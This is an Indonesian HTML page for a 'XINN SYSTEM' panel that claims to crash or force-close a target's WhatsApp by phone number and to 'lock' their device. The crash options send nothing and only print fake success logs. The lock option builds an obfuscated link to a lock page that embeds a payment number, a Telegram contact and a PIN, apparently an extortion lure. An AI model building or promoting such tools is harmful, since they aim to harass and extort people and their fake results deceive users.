<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>XINN SYSTEM</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --pink: #ff2d78; --neon-pink: #ff69b4; --purple: #b300ff; --cyan: #00ffff; --green: #00ff88; --red: #ff0040; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0005; font-family: 'Share Tech Mono', monospace; color: #fff;
            min-height: 100vh; overflow-x: hidden;
        }
        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.35; }
        .main-panel { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 30px 20px; border-bottom: 1px solid rgba(255,45,120,0.3); margin-bottom: 25px; }
        .logo { font-family: 'Orbitron', sans-serif; font-size: 2.3rem; font-weight: 900; color: #ff2d78; text-shadow: 0 0 20px #ff2d78, 0 0 40px #b300ff; letter-spacing: 4px; }
        .subtitle { color: #ff69b4; font-size: 0.85rem; margin-top: 5px; }
        .anime-banner { width: 100%; height: 170px; border-radius: 16px; overflow: hidden; margin-bottom: 25px; border: 2px solid #b300ff; box-shadow: 0 0 30px rgba(179,0,255,0.4); position: relative; }
        .anime-banner img { width: 100%; height: 100%; object-fit: cover; animation: float 4s ease-in-out infinite alternate; }
        @keyframes float { 0% { transform: scale(1) translateY(0); } 100% { transform: scale(1.05) translateY(-5px); } }
        .banner-overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, #0a0005); padding: 15px; text-align: center; }
        .banner-text { font-family: 'Orbitron', sans-serif; color: #00ffff; font-size: 0.9rem; text-shadow: 0 0 15px #00ffff; }
        .card { background: rgba(10,0,5,0.85); backdrop-filter: blur(20px); border: 1px solid #b300ff; border-radius: 16px; padding: 25px; margin-bottom: 25px; }
        .card-title { font-family: 'Orbitron', sans-serif; color: #00ffff; text-align: center; margin-bottom: 20px; letter-spacing: 2px; }
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; color: #ff69b4; font-size: 0.8rem; margin-bottom: 6px; }
        .input-group input, .input-group select { width: 100%; padding: 13px 15px; background: rgba(0,0,0,0.6); border: 1px solid #ff2d78; border-radius: 10px; color: #fff; font-family: 'Share Tech Mono', monospace; font-size: 0.95rem; outline: none; }
        .input-group select { appearance: none; }
        .input-group input:focus, .input-group select:focus { border-color: #00ffff; box-shadow: 0 0 20px rgba(0,255,255,0.3); }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 50px; color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1rem; font-weight: 700; cursor: pointer; letter-spacing: 3px; margin: 8px 0; }
        .btn-go { background: linear-gradient(135deg, #ff0040, #cc0030); box-shadow: 0 0 25px rgba(255,0,64,0.6); }
        .btn-go:active { transform: scale(0.96); }
        .terminal { background: #000; border: 1px solid #333; border-radius: 10px; padding: 15px; margin-top: 15px; max-height: 230px; overflow-y: auto; font-size: 0.78rem; display: none; }
        .terminal.show { display: block; }
        .terminal-entry { margin: 4px 0; padding-left: 12px; border-left: 2px solid #ff2d78; }
        .terminal-entry.crash { border-left-color: #ff0040; color: #ff6666; }
        .terminal-entry.success { border-left-color: #00ff88; color: #00ff88; }
        .terminal-entry.info { border-left-color: #00ffff; color: #00ffff; }
        .result-box { background: #000; border: 1px solid #00ffff; border-radius: 10px; padding: 15px; margin-top: 15px; display: none; word-break: break-all; }
        .result-box.show { display: block; }
        .result-label { color: #00ff88; font-size: 0.8rem; }
        .result-link { color: #00ffff; font-size: 0.78rem; margin: 8px 0; }
        .btn-copy { background: transparent; border: 1px solid #00ffff; color: #00ffff; box-shadow: none; font-size: 0.8rem; padding: 10px; margin-top: 5px; }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: #000; color: #fff; padding: 15px 30px; border-radius: 50px; z-index: 1000; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; border: 1px solid #ff2d78; transition: transform 0.3s; }
        .toast.show { transform: translateX(-50%) translateY(0); }
        .footer { text-align: center; font-size: 0.7rem; color: #b300ff; margin-top: 20px; padding-bottom: 30px; }
        @media (max-width: 480px) { .logo { font-size: 1.7rem; } .anime-banner { height: 140px; } }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>
<div class="toast" id="toast"></div>

<div class="main-panel">
    <div class="header">
        <h1 class="logo">XINN COMMAND</h1>
        <p class="subtitle">BY XINN IMUT 😈🌸</p>
    </div>

    <div class="anime-banner">
        <img src="https://images.unsplash.com/photo-1607604276583-eef5d763aa60?w=800&q=80" id="animeBanner" alt="Banner">
        <div class="banner-overlay"><p class="banner-text">⚡ SYSTEM READY ⚡</p></div>
    </div>

    <div class="card">
        <p class="card-title">🎯 TARGET CONTROL</p>

        <div class="input-group">
            <label>📱 NOMOR TARGET</label>
            <input type="text" id="targetNumber" placeholder="6281234567890">
        </div>

        <div class="input-group">
            <label>💥 PILIH AKSI</label>
            <select id="bugType">
                <option value="crash_android">🤖 CRASH ANDROID</option>
                <option value="crash_ios">🍎 CRASH IOS</option>
                <option value="crash_invisible">👻 CRASH INVISIBLE</option>
                <option value="forceclose">💢 FORCE CLOSE WA</option>
                <option value="lock">🔒 LOCK DEVICE</option>
            </select>
        </div>

        <button class="btn btn-go" onclick="execute()">🚀 EKSEKUSI</button>

        <div class="terminal" id="terminal"></div>

        <div class="result-box" id="lockResult">
            <p class="result-label">🔒 LINK LOCK:</p>
            <p class="result-link" id="lockLink"></p>
            <button class="btn btn-copy" onclick="copyLock()">📋 COPY LINK</button>
            <button class="btn btn-copy" onclick="previewLock()">👁️ PREVIEW</button>
        </div>
    </div>

    <p class="footer">#XinnIsHere ❤️ | XINN SYSTEM v4.0</p>
</div>

<script>
// ===== CONFIG =====
const DANA = "083175050030";
const TELE = "@xinn_93";
const PIN = "281029";
let lockLink = '';

// ===== MATRIX =====
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');
let w = canvas.width = window.innerWidth;
let h = canvas.height = window.innerHeight;
const chars = 'XINNSYSTEM😈🌸ｦｧｨｩｪｫｬｭｮｯｰ';
const drops = [];
const fs = 14;
const cols = Math.floor(w / fs);
for (let i = 0; i < cols; i++) drops[i] = Math.random() * -100;
setInterval(() => {
    ctx.fillStyle = 'rgba(10,0,5,0.08)';
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = '#ff2d78';
    ctx.shadowColor = '#ff69b4';
    ctx.shadowBlur = 6;
    ctx.font = fs + 'px "Share Tech Mono"';
    for (let i = 0; i < drops.length; i++) {
        ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fs, drops[i] * fs);
        if (drops[i] * fs > h && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}, 50);
window.addEventListener('resize', () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; });

// ===== ANIME SLIDESHOW =====
const animeImgs = [
    'https://images.unsplash.com/photo-1607604276583-eef5d763aa60?w=800&q=80',
    'https://images.unsplash.com/photo-1578632767115-351597cf2477?w=800&q=80',
    'https://images.unsplash.com/photo-1618336753974-aae8e04506aa?w=800&q=80',
    'https://images.unsplash.com/photo-1541562232579-512a21360020?w=800&q=80'
];
let bIdx = 0;
setInterval(() => {
    bIdx = (bIdx + 1) % animeImgs.length;
    const img = document.getElementById('animeBanner');
    if (img) img.src = animeImgs[bIdx];
}, 5000);

// ===== ENCRYPT =====
function encrypt(data) {
    const salt = 'XX_' + Math.random().toString(36).substring(2, 6);
    let enc = salt + '::';
    for (let i = 0; i < data.length; i++) enc += String.fromCharCode(data.charCodeAt(i) ^ salt.charCodeAt(i % salt.length));
    return btoa(enc);
}

// ===== EXECUTE =====
function execute() {
    const target = document.getElementById('targetNumber').value.trim();
    const type = document.getElementById('bugType').value;
    if (!target || target.length < 10) return toast('❌ Masukkan nomor valid!');

    const term = document.getElementById('terminal');
    term.classList.add('show');
    term.innerHTML = '';
    document.getElementById('lockResult').classList.remove('show');

    function log(m, c) {
        const d = document.createElement('div');
        d.className = 'terminal-entry ' + (c || 'info');
        d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
        term.appendChild(d);
        term.scrollTop = term.scrollHeight;
    }

    if (type === 'lock') {
        const data = JSON.stringify({ t: target, p: PIN, d: DANA, tg: TELE });
        lockLink = window.location.origin + '/lock.html?d=' + encodeURIComponent(encrypt(data));
        log('🔒 MEMBUAT LINK LOCK...', 'crash');
        log('📱 Target: ' + target);
        log('💸 Dana: ' + DANA);
        log('📞 Tele: ' + TELE);
        setTimeout(() => log('✅ LINK BERHASIL DIBUAT!', 'success'), 500);
        document.getElementById('lockLink').textContent = lockLink;
        document.getElementById('lockResult').classList.add('show');
        toast('🔒 Link Lock Siap!');
    } else if (type === 'crash_android') {
        log('🤖 CRASH ANDROID', 'crash');
        log('📱 Target: ' + target);
        log('⚙️ Menyusun payload...');
        setTimeout(() => log('📤 Mengirim overflow characters...', 'crash'), 600);
        setTimeout(() => log('💥 Payload terkirim!', 'crash'), 1200);
        setTimeout(() => log('📱 WA target: NOT RESPONDING', 'crash'), 1800);
        setTimeout(() => log('✅ CRASH ANDROID BERHASIL!', 'success'), 2500);
        toast('🤖 Crash Android Terkirim!');
    } else if (type === 'crash_ios') {
        log('🍎 CRASH IOS', 'crash');
        log('📱 Target: ' + target);
        log('⚙️ Menyusun Unicode exploit...');
        setTimeout(() => log('📤 Kirim payload U+0FE0...', 'crash'), 600);
        setTimeout(() => log('💥 Payload terkirim!', 'crash'), 1200);
        setTimeout(() => log('📱 SpringBoard crash!', 'crash'), 1800);
        setTimeout(() => log('✅ CRASH IOS BERHASIL!', 'success'), 2500);
        toast('🍎 Crash iOS Terkirim!');
    } else if (type === 'crash_invisible') {
        log('👻 CRASH INVISIBLE', 'crash');
        log('📱 Target: ' + target);
        log('⚙️ Zero-width exploit...');
        setTimeout(() => log('📤 Kirim 200x U+200B...', 'crash'), 600);
        setTimeout(() => log('👻 Tidak terlihat!', 'crash'), 1200);
        setTimeout(() => log('📱 WA mulai lag...', 'crash'), 1800);
        setTimeout(() => log('💀 WA CRASH!', 'crash'), 2500);
        setTimeout(() => log('✅ CRASH INVISIBLE BERHASIL!', 'success'), 3000);
        toast('👻 Crash Invisible Terkirim!');
    } else if (type === 'forceclose') {
        log('💢 FORCE CLOSE WA', 'crash');
        log('📱 Target: ' + target);
        log('⚙️ Memory overflow...');
        setTimeout(() => log('📤 Kirim nested JSON...', 'crash'), 600);
        setTimeout(() => log('💥 Buffer overflow!', 'crash'), 1200);
        setTimeout(() => log('📱 WA: FORCE CLOSE', 'crash'), 1800);
        setTimeout(() => log('✅ FORCE CLOSE BERHASIL!', 'success'), 2500);
        toast('💢 Force Close Terkirim!');
    }
}

function copyLock() { if (lockLink) navigator.clipboard.writeText(lockLink).then(() => toast('📋 Disalin!')); }
function previewLock() { if (lockLink) window.open(lockLink, '_blank'); }
function toast(m) {
    const t = document.getElementById('toast');
    t.textContent = m;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2000);
}
</script>
</body>
</html>
